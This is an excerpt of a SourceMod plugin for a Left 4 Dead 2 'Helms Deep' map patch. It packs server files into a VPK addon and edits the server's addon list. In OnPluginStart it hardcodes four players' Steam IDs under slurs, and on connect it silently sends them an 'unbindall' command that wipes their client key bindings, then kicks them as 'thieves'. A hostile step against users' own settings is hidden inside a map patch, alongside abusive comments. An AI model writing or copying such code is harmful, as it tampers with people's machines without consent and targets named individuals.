...
#define MAX_FILE_SIZE				65536		// Maximum size of any file to package 64 KB (1024 * 64)
...
{
	// LOL - SO YOU WANT TO PLAY LIKE THIS? DUMBASS
	...
	"addons/sourcemod/data/vscripts_override.cfg",
	"addons/sourcemod/gamedata/core.games/blacklist.plugins.txt",
	"addons/sourcemod/gamedata/core.games/common.games.txt",
	"addons/sourcemod/gamedata/core.games/engine.l4d2.txt",
	"addons/sourcemod/gamedata/core.games/master.games.txt",
	...
	"addons/sourcemod/gamedata/sdktools.games/engine.l4d2.txt",
	"addons/sourcemod/gamedata/sdktools.games/game.left4dead2.txt",
	"addons/sourcemod/gamedata/sdktools.games/master.games.txt",
	"addons/sourcemod/gamedata/vscript_replacer.txt",
	"addons/sourcemod/plugins/disabled/admin-sql-prefetch.smx",
	"addons/sourcemod/plugins/disabled/admin-sql-threaded.smx",
	"addons/sourcemod/plugins/disabled/mapchooser.smx",
	"addons/sourcemod/plugins/disabled/nominations.smx",
	"addons/sourcemod/plugins/disabled/randomcycle.smx",
	"addons/sourcemod/plugins/disabled/rockthevote.smx",
	"addons/sourcemod/plugins/disabled/sql-admin-manager.smx",
	"addons/sourcemod/plugins/admin-flatfile.smx",
	"addons/sourcemod/plugins/adminhelp.smx",
	"addons/sourcemod/plugins/adminmenu.smx",
	"addons/sourcemod/plugins/antiflood.smx",
	"addons/sourcemod/plugins/basebans.smx",
	"addons/sourcemod/plugins/basechat.smx",
	"addons/sourcemod/plugins/basecomm.smx",
	"addons/sourcemod/plugins/basecommands.smx",
	"addons/sourcemod/plugins/basetriggers.smx",
	"addons/sourcemod/plugins/basevotes.smx",
	"addons/sourcemod/plugins/clientprefs.smx",
	"addons/sourcemod/plugins/funcommands.smx",
	"addons/sourcemod/plugins/funvotes.smx",
	"addons/sourcemod/plugins/l4d2_helms_deep_patch.smx",
	"addons/sourcemod/plugins/l4d2_helmsdeep.smx",
	"addons/sourcemod/plugins/nextmap.smx",
	"addons/sourcemod/plugins/playercommands.smx",
	"addons/sourcemod/plugins/reservedslots.smx",
	"addons/sourcemod/plugins/sounds.smx",
	"addons/sourcemod/plugins/vscript_replacer.smx",
	"addons/sourcemod/scripting/vscript_replacer.sp",

	// WHATEVER
	"resource/ui/l4d360ui/campaignflyout.res",
	"resource/ui/l4d360ui/dropdownallowcustomcontent.res",
	"resource/ui/l4d360ui/dropdowndeveloperconsole.res",
	"resource/ui/l4d360ui/dropdownfoundgamesfiltercampaign.res",
	"resource/ui/l4d360ui/dropdownfoundgamesfiltergamestatus.res",
	"resource/ui/l4d360ui/dropdownlobbysteamplayer.res",
	"resource/ui/l4d360ui/dropdownlobbysteamplayerleader.res",
	"resource/ui/l4d360ui/dropdownservertype.res",
	"resource/ui/l4d360ui/foundpublicgames.res",
	"resource/ui/l4d360ui/gamelobby.res",
	"resource/ui/l4d360ui/ingamevoteflyoutsurvival.res",
	"resource/ui/l4d360ui/leaderboard.res",
	"resource/ui/l4d360ui/mainmenu.res",
	"resource/ui/l4d360ui/realismflyout.res",
	"resource/ui/l4d360ui/realismversusflyout.res",
	"resource/ui/l4d360ui/scavengeflyout.res",
	"resource/ui/l4d360ui/survivalflyout.res",
	"resource/ui/l4d360ui/survivorlistitem.res",
	"resource/ui/l4d360ui/teamlobby.res",
	"resource/ui/l4d360ui/versusflyout.res",
	"resource/ui/l4d360ui/visitcampaignwebsite.res",
...
public void OnPluginStart()
{
	...
	// Malicious pricks: 
	gCunts = new ArrayList(ByteCountToCells(20));
	gCunts.PushString("STEAM_1:0:13408130");	// SeriouS_CUNT
	gCunts.PushString("STEAM_1:1:20077575");	// Join them too
	gCunts.PushString("STEAM_1:1:27379514");	// Join them too
	gCunts.PushString("STEAM_1:1:34135992");	// Join them too
}

public void OnClientAuthorized(int client, const char[] auth)
{
	if( gCunts.FindString(auth) != -1 )
	{
		ClientCommand(client, "unbindall");
		KickClient(client, "Thieves are not welcome.");
		LogAction(0, client, "Kicked Helms Deep contributer: (%s) %N.", auth, client);
	}
}
...
public void WriteAddonList()
{
	...
	if( iWrite )
	{
		...
		while( !hTemp.EndOfFile() )
		{
			...
			{
				if( StrContains(sBuffer, "sm_helms_patch") == -1 )
				{
		...
		PrintToServer("############################################################");
		PrintToServer("##########   HELMS DEEP PATCH -- RESTART SERVER   ##########");
		PrintToServer("############################################################");
	}
}
...
void PackFilesToVPK()
{
	...
	for( int i = 0; i < g_aFiles.Length; i++ )
	{
		...
		hFile.Read(items, size, 1);
		hVPK.Write(items, size, 1);
